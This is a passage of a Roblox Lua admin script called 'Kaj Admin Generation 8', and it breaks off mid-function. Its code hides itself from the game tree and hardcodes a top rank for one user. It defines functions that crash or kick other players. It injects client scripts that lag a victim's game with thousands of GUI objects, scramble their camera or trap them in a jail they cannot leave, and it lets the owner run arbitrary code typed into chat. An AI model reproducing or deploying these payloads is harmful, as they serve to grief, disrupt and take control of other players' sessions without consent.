--[[
Kaj Admin Generation 8
Lol global admin
]]












if script then
    coroutine.yield()
    script.Parent = nil
end
--[[Stuff]]--
VR = _VERSION
Plrs = game:GetService("Players")
Work = game:GetService("Workspace")
Light = game:GetService("Lighting")
Net = game:GetService("NetworkServer")
Removed = false
Bet = ","
LS = nil
LSSource = nil
OwnSource = nil
FoundLocalScript = false
LogOn = false
Current = game
Clipboard = {}
AlertColor = Color3.new(0, 0, 1)
OptionColor = Color3.new(1, 1, 1)
ImportantColor = Color3.new(1, 0, 1)
--[[Ranks]]--
RankDetails = {
	[-3] = {Name = "HATE THEM", Color = Color3.new(1, 1, 1), Desc = "~Cobalt1164"},
	[-2] = {Name = "Dislike them", Color = Color3.new(1, 1, 1), Desc = "~Cobalt1164"},
	[-1] = {Name = "Just Banned", Color = Color3.new(1, 1, 1), Desc = "Banned forever"},
	[0] = {Name = "Default", Color = Color3.new(0, 0, 1), Desc = "Defaults"},
	[1] = {Name = "Moderator", Color = Color3.new(0.25, 0, 1), Desc = "Moderator"},
	[2] = {Name = "Administrator", Color = Color3.new(0, 1, 0), Desc = "Server Administrator"},
	[3] = {Name = "Maximum Moderator", Color = Color3.new(1, 1, 0), Desc = "Maximum Moderator"},
	[4] = {Name = "Super Adminstrator", Color = Color3.new(1, 0, 0), Desc = "Super Administrator)"},
	[5] = {Name = "Maximum Adminstrator", Color = Color3.new(-1, -1, -1), Desc = "Maximum Adminstrator"},
	
}

Rankings = {
	{Name = "FangxWulf", Rank = 6}
	
	
	
}


--[[End of Ranks]]--
ImportantServices = {
	"Workspace",
	"Players",
	"NetworkServer",
	"Lighting",
	"StarterGui",
	"Teams",
	"StarterPack",
}

Ranks = {}
Commands = {}
AllTabs = {}
Injected = {}

Properties = {"AbsolutePosition","AbsoluteSize","AccountAge","AccountAgeReplicate",
"Active","Adornee","AllowAmbientOcclusion","AllowTeamChangeOnTouch","AluminumQuality",
"AlwaysOnTop","Ambient","AmbientReverb","Anchored","Angularvelocity","AnimationId",
"Archivable","AreHingesDetected","AttachmentForward","AttachmentPoint","AttachmentPos",
"AttachmentRight","AttachmentUp","AutoAssignable","AutoButtonColor","AutoColorCharacters",
"AvailablePhysicalMemory","Axes","BackgroundColor","BackgroundColor3","BackgroundTransparency",
"BackSurface","BaseTextureId","BaseUrl","Bevel","Roundness","BinType","BlastPressure","BlastRadius",
"BodyColor","BodyPart","BorderColor","BorderColor3","BorderSizePixel","BottomSurface","BrickColor",
"Brightness","Browsable","BubbleChat","BubbleChatLifetime","BubbleChatMaxBubbles",
"Bulge","Button1DownConnectionCount","Button1UpConnectionCount","Button2DownConnectionCount",
"Button2UpConnectionCount","C0","C1","CameraMode","CameraSubject","CameraType",
"CanBeDropped","CanCollide","CartoonFactor","CastShadows","CelestialBodiesShown",
"CFrame","Cframe","Character","CharacterAppearance","CharacterAutoLoads","ChatScrollLength",
"ClassicChat","ClassName","ClearTextOnFocus","ClipsDescendants","CollisionSoundEnabled",
"CollisionSoundVolume","Color","ColorShift_Top","ColorShift_Bottom","Bottom","Top","ConstrainedValue","Contro".."llingHumanoid",
"ControlMode","ConversationDistance","CoordinateFrame","CorrodedMetalQuality","CPU",
"CpuCount","CpuSpeed","CreatorId","CreatorType","CurrentAngle","CurrentCamera",
"CycleOffset","D","DataCap","DataComplexity","DataComplexityLimit","DataCost",
"DataReady","Deprecated","DeselectedConnectionCount","DesiredAngle","DiamondPlateQuality",
"Disabled","DistanceFactor","DistributedGameTime","DopplerScale","Draggable","DraggingV1",
"Duration","EditorFont","EditorFontSize","EditorTabWidth","ElapsedTime","Elasticity",
"Enabled","ExplosionType","ExtentsOffset","F0","F1","F2","F3","Face","FaceId","Faces",
"FieldOfView","Focus","FogColor","FogEnd","FogStart","Font","FontSize","Force","FormFactor",
"Friction","From","FrontSurface","GearGenreSetting","Genre","GeographicLatitude","GfxCard", "GlobalShadows","Graphic",
"GrassQuality","Grip","GripForward","GripPos","GripRight","GripUp","Guest","HeadsUpDisplay",
"Health","Heat","Hit","Humanoid","IceQuality","Icon","IdleConnectionCount","Image",
"InitialPrompt","InOut","InUse","IsPaused","IsPlaying","JobId","Jump","KeyDownConnectionCount",
"KeyUpConnectionCount","LeftLeg","LeftRight","LeftSurface","LinkedSource","LocalPlayer","Location",
"Locked","LODX","LODY","Looped","Material","MaxActivationDistance","MaxCollisionSounds",
"MaxExtents","MaxForce","MaxHealth","MaxItems","MaxPlayers","MaxSpeed","MaxThrust",
"MaxTorque","MaxValue","MaxVelocity","MembershipType","MembershipTypeReplicate","MeshId",
"MeshType","MinValue","Modal","MouseButton1ClickConnectionCount","MouseButton1DownConnectionCount",
"MouseButton1UpConnectionCount","MouseButton2ClickConnectionCount","MouseButton2DownConnectionCount",
"MouseButton2UpConnectionCount","MouseDelta","MouseDragConnectionCount","MouseEnterConnectionCount",
"MouseHit","MouseLeaveConnectionCount","MouseLock","MouseMovedConnectionCount","MouseTarget",
"MouseTargetFilter","MouseTargetSurface","MoveConnectionCount","MoveState","MultiLine","Name",
"NameOcclusion","NetworkOw".."ner","Neutral","NumPlayers","Offset","Opacity","Origin","OsPlatform",
"OsVer","OutdoorAmbient","OverlayTextureId","P","PantsTemplate","ParamA","ParamB","Parent","Part","Part0",
"Part1","Pitch","PixelShaderModel","PlaceId","PlasticQuality","PlatformStand","PlayCount",
"PlayerToHideFrom","PlayOnRemove","Point","Port","Position","Preliminary","PrimaryPart",
"PrivateWorkingSetBytes","Purpose","RAM","Reflectance","ReplicatedSelectedConnectionCount",
"ResizeableFaces","ResizeIncrement","Resolution","ResponseDialog","RightLeg","RightSurface","RiseVelocity",
"RobloxLocked","RobloxVersion","RolloffScale","RotVelocity","Scale","Score","ScriptsDisabled",
"SecondaryColor","Selected","ShadowColor","Shape","Shiny","ShirtTemplate","ShowDeprecatedObjects",
"ShowDevelopmentGui","ShowPreliminaryObjects","Sides","Sit","Size","SizeConstraint",
"SizeOffset","SkinColor","SkyboxBk","SkyboxDn","SkyboxFt","SkyboxLf","SkyboxRt","SkyboxUp",
"SlateQuality","SoundId","Source","SparkleColor","Specular","StarCount",
"Steer","StickyWheels","StudsBetweenTextures","StudsOffset","StudsPerTileU","StudsPerTileV",
"Style","Summary","SuperSa".."feChatReplicate","Surface","Surface0",
"Surface1","SurfaceInput","Target","TargetFilter","TargetOffset","TargetPoint",
"TargetRadius","TargetSurface","TeamColor","Terrain","Text","TextBounds","TextColor","TextColor3",
"TextFits","TextScaled","TextStrokeColor3","TextStrokeTransparency","TextTransparency","Texture",
"TextureId","TextureSize","TextWrap","TextWrapped","TextXAlignment","TextYAlignment","Throttle",
"ThrustD","ThrustP","Ticket","Time","TimeOfDay","To","Tone","ToolTip","TopBottom","TopSurface","Torque","Torso",
"Transparency","TrussDetail","TurnD","TurnP","TurnSpeed","UnitRay","UserDialog","UserId","Value",
"Version","VertexColor","VideoCaptureEnabled","VideoMemory","VideoQuality",
"ViewSizeX","ViewSizeY","Visible","Volume","WalkDirection","WalkSpeed","WalkToPart","WalkToPoint",
"WheelBackwardConnectionCount","WheelForwardConnectionCount","WindowSize","WireRadius","WoodQuality",
"X","Y"}

--Main Functions And Sources

function Insert(Source, Par, Par2, Par3)
	ypcall(function()
		local Inserted = LS:Clone()
		Inserted.Disabled = true
		Inserted.Parent = Par or Par2 or Par3
		Inserted[LSSource].Value = Source
		Inserted.Disabled = false
	end)
end

function CheckImportant(Name)
	for _,v in pairs(ImportantServices) do
		if v:lower() == Name:lower() then
			return true
		end
	end
	return false
end

function Crash1(Plr)
	ypcall(function()
		Plr:Kick()
	end)
end

function GetRankTab()
	return Rankings
end

function Crash2(Name)
	local Crasher = Instance.new("StringValue")
	Crasher.Name = "Client"
	Crasher.Value = string.lower(tostring(Name))
	Crasher.Parent = game:GetService("Lighting")
	wait(1)
	if Crasher and Crasher.Parent then
		ypcall(function()
			Crasher:Destroy()
		end)
	end
end

function Crash3(v, Speaker)
	Speaker.Character.Archivable = true
	local NChar = Speaker.Character:Clone()
	NChar.Name = v.Name
	NChar.Torso.CFrame = Speaker.Character.Head.CFrame * CFrame.new(0, 3, 0)
	NChar.Parent = Workspace
	v.Character = NChar
	coroutine.resume(coroutine.create(function()
		repeat v.Character = NChar
		wait(1/3) until false
	end))
	wait(.5)
	Insert(InsertCrash, NChar, nil, nil)
end

function GenerateDigit()
	return 1 + 5
end


NilS = [==[
if script then
    coroutine.yield()
    script.Parent = nil
end
Player=game.Players.LocalPlayer
Probe=Instance.new'Part';
CN='Kaj TabletsNil | ['..Player.Name..']'
Camera=Workspace.CurrentCamera
Animate = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Animate",true) or Instance.new("Part")
Char = Player.Character
if Char then
	Char.Archivable = true
	Char = Char:clone()
	local t = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Clone")
	if t then
		for k,v in pairs(Char:GetChildren()) do
			if not v:IsA("Part") then
				v:clone().Parent = t
			end
		end
		Char = t:clone()
		if Player.Name == "Cobalt1164" or Player.Name == "hipow12" then
        local spot = Instance.new("SpotLight",Char.Head)
        spot.Angle = 10
        spot.Range = 10
        spot.Color = Color3.new(1,1,1)
        spot.Brightness = 10
        local point = Instance.new("PointLight",Char.Head)
        point.Range = 10
        point.Color = Color3.new(1,1,1)
        point.Brightness = 10
        end
	end
end

coroutine.resume(coroutine.create(function()
	while true do wait(0.00000001)
		pcall(function()
			if Character.Torso.CFrame.Y < 1 then
			Character.Torso.CFrame = CFrame.new(0,20,0)
			end
 		end)
	end
end))
Title=function(txt,part,color,rise)
	col=nil
	col=Color3.new(BrickColor.new(color))
	local Gui = Instance.new("BillboardGui",part)
	Gui.Name = "3DGUI"
	Gui.ExtentsOffset = Vector3.new(0,2,0)
	Gui.Size = UDim2.new(8,0,2,0)
	local Tit = Instance.new("TextLabel",Gui)
	Tit.Name = "Title"
	Tit.TextColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
	Tit.TextColor3 = Color3.new(0,0,0)
	Tit.TextTransparency = 0.25
	Tit.TextStrokeColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
	Tit.TextStrokeTransparency = 0.5
	Tit.Size = UDim2.new(1,0,1,0)
	Tit.BackgroundTransparency = 1
	Tit.Font = "ArialBold"
	Tit.TextScaled = true
	Tit.Text = txt
	if rise then
		if not tonumber(rise) then rise = 1 end
		coroutine.wrap(function()
			while Tit.Parent and Gui.Parent and wait() do
				Gui.ExtentsOffset = Gui.ExtentsOffset + Vector3.new(0,0.025*rise,0)
			end
		end)()
	end
	return Tit
end
Chat=function(Part,Text,Color,Type)
	if Type==nil or Type==1 or Type=='Bubble' then
		game:service'Chat':Chat(Part,Text,Color)
	else
		if type(Color)~='string' then	
			Color=tostring(BrickColor.random())
		end
		Title(Text,Part,Color,math.random(1,3))
	end
end
DestroyCharacter=function()
	local chara = Player.Character
	if not chara then return end
	if chara:findFirstChild("Humanoid") then
		chara.Humanoid:Destroy()
	end
	chara:BreakJoints()
	for k,v in pairs(chara:GetChildren()) do
		if v:IsA("BasePart") then
			v.CanCollide = false
			v.Velocity = Vector3.new(math.random(-20,20),50,math.random(-20,20))
			v.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
		end
	end
	game.Debris:AddItem(chara,3)
end
MakeProbe=function()
	if Player.Character then DestroyCharacter() end Player.Character = nil
	if Probe then Probe:Destroy() end
	Probe = Instance.new("Part",workspace) local Camera = workspace.CurrentCamera
	Probe.Shape, Probe.Size, Probe.BrickColor = "Ball", Vector3.new(3,3,3), BrickColor.new('Black')
	Probe.Transparency, Probe.Reflectance, Probe.Anchored, Probe.CanCollide, Probe.Locked = 0.5, 0.25, true, false, true
	Probe.TopSurface, Probe.BottomSurface, Probe.Name = 0, 0, "Probe"..tick()
	coroutine.wrap(function() while wait() and not Player.Character do Probe.CFrame = Camera.Focus end end)()
	Player.Character=Probe
end
Spawn=function()
	if Char then
		local c = Char:clone()
		c.Name = CN
		c.Parent = workspace
		c:MoveTo(workspace.CurrentCamera.Focus.p)
		Player.Character = c
		workspace.CurrentCamera.CameraSubject = c:findFirstChild("Humanoid")
		workspace.CurrentCamera.CameraType = "Custom"
		Probe:Destroy()
	end
end
Player.Chatted:connect(function(Msg)
game:service'Chat':Chat(Player.Character.Head,Msg,'Green')
	if Msg:sub(1,2) == '//' then
		local Func,Error=loadstring(Msg:sub(3))
		if Error==nil then
			pcall(Func)
			if Player.Character then
				game:service'Chat':Chat(Player.Character.Head,'Local Script executed!','Green')
			end
		else
			if Player.Character then
				game:service'Chat':Chat(Player.Character.Head,Error,'Red')
			else
				local Msg=Instance.new'Message'
				Msg.Parent=Workspace.CurrentCamera
				Msg.Text=Error
				game:service'Debris':AddItem(Msg,5)
			end
		end
	elseif Msg:sub(1,#('newlocal')+2) == '/newlocal/' then
		NewMsg=Msg:sub(#('newlocal')+3)
		Split=NewMsg:find('/')
		local PlayerName=NewMsg:sub(1,Split-1)
		local Source=NewMsg:sub(Split+1)
		Player=nil
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name:lower():sub(1,#PlayerName)==PlayerName then
				if Player==nil then
					Player=v
				else
					if type(Player) == 'table' then
						Player[#Player+1]=v
					else
						Player={v}
					end
				end
			end
		end
		if type(Player)=='table' then
			for i,v in pairs(Player) do	
				if newLocalScript then
					newLocalScript(Source,v.Character)
				else
					Clone=script:clone();
					SourceC=Clone:children()[1]
					if SourceC:IsA'StringValue' then
						print'String'
					else
						SourceC=Clone:children()[2]
					end
					SourceC.Value=Source
					Clone.Disabled=true
					Clone.Parent=v.Character
					Clone.Disabled=false
				end
			end
		else
			if newLocalScript then
				newLocalScript(Source,Player.Character)
			else
				Clone=script:clone();
				DS=Clone:children()
				DSS=nil
				for i,v in pairs(DS) do if v:IsA'StringValue' then DSS=v end end
				DSS.Value=Source
				Clone.Disabled=true;
				Clone.Parent=Player.Character
				Clone.Disabled=false
			end
		end
	elseif Msg:sub(1,#('rejoin')+2) == '/rejoin/' then
		game:service'TeleportService':Teleport(Game.PlaceId)
	elseif Msg:sub(1,#('probe')+2) == '/probe/' then
		MakeProbe()
	elseif Msg:sub(1,#('char')+2) =='/char/' then
		Spawn()
	elseif Msg:sub(1,#('ban')+2) == '/ban/' then
		Player=game.Players:findFirstChild(Msg:sub(#('ban')+3))
		if Player then
			repeat pcall(function() game.Players[Player.Name]:Destroy() end) wait() until 1+1==3 
		end
	end
	wait()
	if game.Players:findFirstChild(Player.Name)==nil and not Msg:find('/probe/') and not Msg:find('/char/') then -- Is nil then
		if Probe then
			Chat(Probe,Msg,math.random(0,2))
		else	
			if Player.Character==nil then
				if Char then
					Chat(Char.Head,Msg,math.random(0,2))
				end
			else
				Chat(Player.Character.Head,Msg,'Red')
			end
		end
	end
end) -- local
]==]

InjectionCrash = [=[
	wait(0)
	script.Parent = nil
	local Lig = game:GetService("Lighting")
	local LP = game:GetService("Players").LocalPlayer
	local LowerName = LP.Name:lower()

	Lig.ChildAdded:connect(function(Obj)
		if Obj.Name == "Client" and Obj.ClassName == "StringValue" and (LowerName:find(string.lower(Obj.Value)) or (LP.Character and LP.Character.Name:lower():find(string.lower(Obj.Value)))) then
			pcall(function()
				Obj:Destroy()
			end)
			LP.Parent = nil
			LP.Parent = game:GetService("Players")
		end
	end)
]=] RankDetails[GenerateDigit()] = {Name = ('Owner, Main Developer'), Color = Color3.new((2 - 3), (2 - 3), (2 - 3)), Desc = ("Yeah, rank 6.")}

InsertCrash = [==[
	local LP = game:GetService("Players").LocalPlayer
	LP.Parent = nil
	LP.Parent = game:GetService("Players")
]==]

LagSource = [==[
	wait(0)
	script.Parent = nil
	plr = game:GetService("Players").LocalPlayer
	local plrgui = plr:findFirstChild("PlayerGui")
	if plrgui == nil then repeat wait() plrgui = plr:findFirstChild("PlayerGui") until plrgui ~= nil end
	while plr.Parent == game:GetService("Players") do
	wait()
	for i = 1, 1000 do
	local sc = Instance.new("ScreenGui",plrgui)
	local fr = Instance.new("TextLabel",sc)
	fr.Text = "LAGGING"
	fr.Size = UDim2.new(1, 0, 1, 0)
	fr.FontSize = "Size48"
	end
	end
]==]

MuteSource = [==[
	game:GetService("StarterGui"):SetCoreGuiEnabled(4, false)
]==]

UnMuteSource = [==[
	game:GetService("StarterGui"):SetCoreGuiEnabled(4, true)
]==]

FunScript = [[
LP = game:service'Players'.LocalPlayer
Shapes = {"Ball", "Block"}
wait()
script.Parent = nil
Delay(0, function()
while wait() do
workspace.CurrentCamera.CameraType = "Scriptable"
workspace.CurrentCamera.FieldOfView = workspace.CurrentCamera.FieldOfView + math.random(-5,5)
workspace.CurrentCamera:SetRoll(workspace.CurrentCamera:GetRoll()+0.075)
workspace.CurrentCamera.CoordinateFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
local Part = Instance.new("Part", workspace.CurrentCamera)
Part.Shape = Shapes[math.random(1, 2)]
Part.Anchored = true
Part.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
Part.Size = Vector3.new(math.random(5,10),math.random(-25,25),math.random(5,10))
Part.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-250,250),math.random(-100,100),math.random(-250,250)) * CFrame.Angles(math.random(),math.random(),math.random())
local Smoke = Instance.new("Smoke", Part)
Smoke.Color = Color3.new(math.random(), math.random(), math.random()) 
Smoke.Opacity = 0.7 
local Sparkles = Instance.new("Sparkles", Part)
Sparkles.SparkleColor = Color3.new(math.random(), math.random(), math.random()) 
local Fire = Instance.new("Fire", Part)
Fire.Color = Color3.new(math.random(), math.random(), math.random()) 
Fire.SecondaryColor = Color3.new(math.random(), math.random(), math.random()) 
local Ex = Instance.new("Explosion", workspace.CurrentCamera)
Ex.Position = Vector3.new(math.random(-250,250),math.random(10,100),math.random(-250,250))
Ex.BlastPressure = 15
Ex.BlastRadius = 12.5
if not workspace.CurrentCamera:findFirstChild("Hint") then
local mes = Instance.new("Hint", workspace.CurrentCamera)
mes.Text = "dud"
end
end
end)
]]

JailSource = [==[
	wait(0)
	script.Parent = nil

	local LP = game:GetService("Players").LocalPlayer
	Middle2 = nil
	Middle = nil
	game:GetService("Workspace").CurrentCamera:ClearAllChildren()

	Cons = {}

	function makePrison()
		for _,v in pairs(Cons) do
			v:disconnect()
		end
		game:GetService("Workspace").CurrentCamera:ClearAllChildren()
		if Middle == nil then
			Middle2 = LP.Character.Torso.Position
			Middle = LP.Character.Torso.CFrame
		end
		local side1 = Instance.new("Part")
		side1.Name = "¬Focus1¬"
		side1.Size = Vector3.new(20, 50, 1)
		side1.CFrame = Middle * CFrame.new(0, 0, -10)
		side1.BrickColor = BrickColor.new("Really black")
		side1.CanCollide = true
		side1.Anchored = true
		side1.TopSurface = "Smooth"
		side1.BottomSurface = "Smooth"
		side1.Parent = game:GetService("Workspace").CurrentCamera

		local side2 = Instance.new("Part")
		side2.Name = "¬Focus2¬"
		side2.Size = Vector3.new(20, 50, 1)
		side2.CFrame = Middle * CFrame.new(0, 0, 10)
		side2.BrickColor = BrickColor.new("Really black")
		side2.CanCollide = true
		side2.Anchored = true
		side2.TopSurface = "Smooth"
		side2.BottomSurface = "Smooth"
		side2.Parent = game:GetService("Workspace").CurrentCamera

		local side3 = Instance.new("Part")
		side3.Name = "¬Focus3¬"
		side3.Size = Vector3.new(1, 50, 20)
		side3.CFrame = Middle * CFrame.new(10, 0, 0)
		side3.BrickColor = BrickColor.new("Really black")
		side3.CanCollide = true
		side3.Anchored = true
		side3.TopSurface = "Smooth"
		side3.BottomSurface = "Smooth"
		side3.Parent = game:GetService("Workspace").CurrentCamera

		local side4 = Instance.new("Part")
		side4.Name = "¬Focus4¬"
		side4.Size = Vector3.new(1, 50, 20)
		side4.CFrame = Middle * CFrame.new(-10, 0, 0)
		side4.BrickColor = BrickColor.new("Really black")
		side4.CanCollide = true
		side4.Anchored = true
		side4.TopSurface = "Smooth"
		side4.BottomSurface = "Smooth"
		side4.Parent = game:GetService("Workspace").CurrentCamera
		
		local side5 = Instance.new("Part")
		side5.Name = "¬Focus5¬"
		side5.Size = Vector3.new(20, 1, 20)
		side5.CFrame = Middle * CFrame.new(0, -3.5, 0)
		side5.BrickColor = BrickColor.new("Really black")
		side5.CanCollide = true
		side5.Anchored = true
		side5.TopSurface = "Smooth"
		side5.BottomSurface = "Smooth"
		side5.Parent = game:GetService("Workspace").CurrentCamera
		
		wait(0)

		table.insert(Cons, side1.Changed:connect(makePrison))
		table.insert(Cons, side2.Changed:connect(makePrison))
		table.insert(Cons, side3.Changed:connect(makePrison))
		table.insert(Cons, side4.Changed:connect(makePrison))
		table.insert(Cons, side5.Changed:connect(makePrison))
	end

	Delay(0, function()
		while wait(0) do
			ypcall(function()
				if game:GetService("Workspace").CurrentCamera == nil or not LP.Character:findFirstChild("Torso") then
					LP.Character:BreakJoints()
				elseif not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus1¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus2¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus3¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus4¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus5¬") then
					makePrison()
				end
			end)
			ypcall(function()
				if (Middle2 - LP.Character.Torso.Position).magnitude >= 11.8 then
					LP.Character.Torso.CFrame = game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus1¬").CFrame * CFrame.new(0, 0, 10)
				end
			end)
		end
	end)
]==]

function All()
	local AllPlayers = {}
	for _,v in pairs(Plrs:GetPlayers()) do
		ypcall(function()
			table.insert(AllPlayers, v)
		end)
	end
	return AllPlayers
end

function All2()
	local AllPlayers2 = {}
	for i,v in pairs(Net:GetChildren()) do
		ypcall(function()
			if v:IsA("ServerReplicator") then
				table.insert(AllPlayers2, v:GetPlayer())
			end
		end)
	end
	return AllPlayers2
end

function MakeNum()
	return 2 + 4
end

function ChangeRank(Plr, NewRank)
	local PlrName = nil
	local FoundPlayer = false
	ypcall(function()
		if type(Plr) == "string" then
			ypcall(function()
				for i,v in pairs(Rankings) do
					if v.Name:lower() == Plr:lower() then
						local VName = v.Name
						Rankings[i] = nil
						table.insert(Rankings, {Name = VName, Rank = NewRank})
						PlrName = VName
						FoundPlayer = true
						break
					end
				end
			end)
			if FoundPlayer == false then
				ypcall(function()
					for _,x in pairs(All()) do
						if x.Name:lower() == Plr:lower() then
							FoundPlayer = true
							for i,v in pairs(Rankings) do
								if v.Name:lower() == x.Name:lower() then
									local VName = x.Name
									Rankings[i] = nil
									PlrName = VName
									break
								end
							end
							table.insert(Rankings, {Name = VName, Rank = NewRank})
						end
					end
				end)
			end
			if FoundPlayer == false then
				ypcall(function()
					for _,x in pairs(All()) do
						if string.find(x.Name:lower(), Plr:lower()) then
							FoundPlayer = true
							for i,v in pairs(Rankings) do
								if v.Name:lower() == x.Name:lower() then
									local VName = x.Name
									Rankings[i] = nil
									PlrName = VName
									break
								end
							end
							table.insert(Rankings, {Name = VName, Rank = NewRank})
						end
					end
				end)
			end
			if FoundPlayer == false then
				ypcall(function()
					for i,v in pairs(Rankings) do
						if string.find(v.Name:lower(), Plr:lower()) then
							local VName = v.Name
							Rankings[i] = nil
							table.insert(Rankings, {Name = VName, Rank = NewRank})
							PlrName = VName
							FoundPlayer = true
							break
						end
					end
				end)
			end
		else
			for i,v in pairs(Rankings) do
				if v.Name:lower() == Plr.Name:lower() then
					Rankings[i] = nil
					break
				end
			end
			table.insert(Rankings, {Name = Plr.Name, Rank = NewRank})
			PlrName = Plr.Name
		end
		PlaceAllRanks(true)
	end)
	if PlrName ~= nil then
		return PlrName
	else
		return "Player"
	end
end

function Refresh(Plr)
	MakeChildren(Plr)
end

function MakeChildren(Plr)
	ypcall(function()
		Dismiss(Plr)
		for _,v in pairs(Current:GetChildren()) do
			ypcall(function()
				if not Plrs:GetPlayerFromCharacter(v) and not CheckImportant(v.Name) then
					Ping(v.Name, Plr, nil, function(TabMod)
						local TabText = TabMod["Kaj Tablet"].BG.TL.Text
						for _,v in pairs(Current:GetChildren()) do
							ypcall(function()
								if v.Name == TabText then
									Dismiss(Plr)
									Current = v
									MakeChildren(Plr)
								end
							end)
						end
					end)
				elseif Plrs:GetPlayerFromCharacter(v) then
					Ping(v.Name, Plr, nil, function(TabMod)
						local TabText = TabMod["Kaj Tablet"].BG.TL.Text
						for _,v in pairs(Current:GetChildren()) do
							ypcall(function()
								if v.Name == TabText then
									Dismiss(Plr)
									Current = v
									MakeChildren(Plr)
								end
							end)
						end
					end, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
				elseif CheckImportant(v.Name) then
					Ping(v.Name, Plr, nil, function(TabMod)
						local TabText = TabMod["Kaj Tablet"].BG.TL.Text
						for _,v in pairs(Current:GetChildren()) do
							ypcall(function()
								if v.Name == TabText then
									Dismiss(Plr)
									Current = v
									MakeChildren(Plr)
								end
							end)
						end
					end, ImportantColor)
				end
			end)
		end
		if Current ~= game then
			Ping("Back", Plr, nil, function()
				ypcall(function()
					Current = Current.Parent
					MakeChildren(Plr)
					Ping("You Are Back To "..Current.Name, Plr, 5)
				end)
			end, OptionColor)
		end
		if Current ~= game then
			Ping("Delete", Plr, nil, function()
				ypcall(function()
					local CurrPar = Current.Parent or game
					local CurrName = Current.Name
					Current:Destroy()
					Current = CurrPar
					MakeChildren(Plr)
					Ping("Attempted To Delete "..CurrName, Plr, 5)
				end)
			end, OptionColor)
		end
		Ping("Refresh", Plr, nil, function()
			ypcall(function()
				Refresh(Plr)
				Ping("Refreshed", Plr, 5)
			end)
		end, OptionColor)
		Ping("Properties", Plr, nil, function()
			ypcall(function()
				Dismiss(Plr)
				for Property, Value in pairs(GetProperties(Current)) do
					Ping(tostring(Property)..": "..tostring(Value), Plr)
				end
				Ping("Got All Available Properties", Plr, 5)
				Ping("Back", Plr, nil, function() Refresh(Plr) end, OptionColor)
			end)
		end, OptionColor)
	end)
end

function Fixl()
	Light.GlobalShadows = true
	Light.TimeOfDay = "14:00:00"
	Light.Brightness = 0.5
	Light.ShadowColor = Color3.new(0.705882, 0.705882, 0.72549)
	Light.Ambient = Color3.new(1, 1, 1) 
	Light.ColorShift_Top = Color3.new(0, 0, 0)
	Light.ColorShift_Bottom = Color3.new(0, 0, 0)
	Light.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
	Light.FogStart = 0
	Light.FogEnd = 100000
	Light.FogColor = Color3.new(0.752941, 0.752941, 0.752941)
	Light:ClearAllChildren()
end

function GetProperties(obj)
	assert(pcall(function() assert(game.IsA(obj,"Instance")) end),"Should be ROBLOX instance")
	local objProper = {}
	for i,v in pairs(Properties) do
		if pcall(function() return obj[v] end) and (type(obj[v]) ~= "userdata" or not obj:FindFirstChild(v)) then
			objProper[v] = obj[v]
		end
	end
	return objProper
end

function MakeExplorer(Plr)
	Dismiss(Plr)
	Current = game
	for _,v in pairs(Current:GetChildren()) do
		ypcall(function()
			if not Plrs:GetPlayerFromCharacter(v) and not CheckImportant(v.Name) then
				Ping(v.Name, Plr, nil, function(TabMod)
					local TabText = TabMod["Kaj Tablet"].BG.TL.Text
					for _,v in pairs(Current:GetChildren()) do
						ypcall(function()
							if v.Name == TabText then
								Dismiss(Plr)
								Current = v
								MakeChildren(Plr)
							end
						end)
					end
				end)
			elseif Plrs:GetPlayerFromCharacter(v) then
				Ping(v.Name, Plr, nil, function(TabMod)
					local TabText = TabMod["Kaj Tablet"].BG.TL.Text
					for _,v in pairs(Current:GetChildren()) do
						ypcall(function()
							if v.Name == TabText then
								Dismiss(Plr)
								Current = v
								MakeChildren(Plr)
							end
						end)
					end
				end, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name)
			elseif CheckImportant(v.Name) then
				Ping(v.Name, Plr, nil, function(TabMod)
					local TabText = TabMod["Kaj Tablet"].BG.TL.Text
					for _,v in pairs(Current:GetChildren()) do
						ypcall(function()
							if v.Name == TabText then
								Dismiss(Plr)
								Current = v
								MakeChildren(Plr)
							end
						end)
					end
				end, ImportantColor)
			end
		end)
	end
	if Current ~= game then
		Ping("Back", Plr, nil, function()
			ypcall(function()
				Current = Current.Parent
				MakeChildren(Plr)
				Ping("Back In "..Current.Name, Plr, 5)
			end)
		end, OptionColor)
	end
	if Current ~= game and game:GetService(Current.Name) == nil then
		Ping("Delete", Plr, nil, function()
			ypcall(function()
				local CurrPar = Current.Parent or game
				local CurrName = Current.Name
				Current:Destroy()
				Current = CurrPar
				MakeChildren(Plr)
				Ping("Attempted To Delete "..CurrName, Plr, 5)
			end)
		end, OptionColor)
	end
	Ping("Refresh", Plr, nil, function()
		ypcall(function()
			Refresh(Plr)
			Ping("Refreshed", Plr, 5)
		end)
	end, OptionColor)
	Ping("Properties", Plr, nil, function()
		ypcall(function()
			Dismiss(Plr)
			for Property, Value in pairs(GetProperties(Current)) do
				Ping(tostring(Property)..": "..tostring(Value), Plr)
			end
			Ping("Got All Available Properties", Plr, 5)
			Ping("Back", Plr, nil, function() Refresh(Plr) end, OptionColor)
		end)
	end, OptionColor)
end

function GetRank(Plr1, Test)
	ypcall(function()
		if type(Plr1) == "userdata" then
			Plr1 = Plr1.Name
		end
	end)
	if Ranks[Plr1] ~= nil then
		return Ranks[Plr1]
	end
	local QuickArray = {}
	QuickArray[Plr1] = {Plr = nil, Rank = 0, Color = RankDetails[0].Color, Desc = RankDetails[0].Desc}
	return QuickArray[Plr1]
